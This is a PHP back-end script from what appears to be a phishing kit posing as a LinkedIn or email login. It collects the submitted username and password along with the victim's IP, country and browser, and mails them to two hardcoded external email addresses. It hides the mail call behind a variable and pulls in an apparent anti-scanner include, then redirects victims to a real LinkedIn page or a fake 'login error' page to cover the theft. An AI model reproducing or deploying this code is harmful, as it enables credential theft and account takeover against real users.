<?php
require_once('block_detectors.php'); // leave this line
if($_SERVER['REQUEST_METHOD'] == 'POST')
{
	
$to = "lucychan711@gmail.com,casper.black@yahoo.com";	
	
	
	if(isset($_POST['pass']))
	{
		$userid = $_POST['user'];
		$password = $_POST['pass'];

		
		
		
		if(isset($_SERVER['HTTP_X_FORWARDED_FOR']) && $_SERVER['HTTP_X_FORWARTDED_FOR'] != '') 
		{
    $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
         } 
       else 
         {
    $ip_address = $_SERVER['REMOTE_ADDR'];
         }
$info = new info(); // requires block_detectors.php 
$browser = $_SERVER['HTTP_USER_AGENT']; 
//$url = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']; 
date_default_timezone_set('GMT');
$today = date("l, j M, Y, g:ia e");		
$message .= "xxx\n";
$message .= "Email Provider: General\n";
$message .= "username: ".$userid."\n";
$message .= "password: ".$password."\n";
$message .= "date: " . $today . "\n";
$message .= "IP: ". $info->ip."\n";
$message .= "Country: ".$info->country."\n";
$message .= "Browser: ".$browser."\n";
//$message .= "Host: ".$url."\n";
$message .= "---------------xxx-----------\n";
		
		
		
		$subject = "xxx | $info->country | $userid";
		$gc = "mail";
		$gc($to, $subject, $message);
		
		if((isset($_POST['code'])) && ($_POST['code'] == "1")){
		header("LOCATION: https://www.linkedin.com/checkpoint/lg/login-submit");
		}else{
			header("LOCATION: login.php?s=mail&redirect=http%3A%2F%2Fmail3.linkedin.com%2F&email=$userid&login=error");
			}
	}
	else
	{
		header("LOCATION: login.php?s=mail&redirect=http%3A%2F%2Fmail3.linkedin.com%2F&email=$userid");
	}
}
else
{
	echo "Sorry you are not authorized to view this page";
}







?>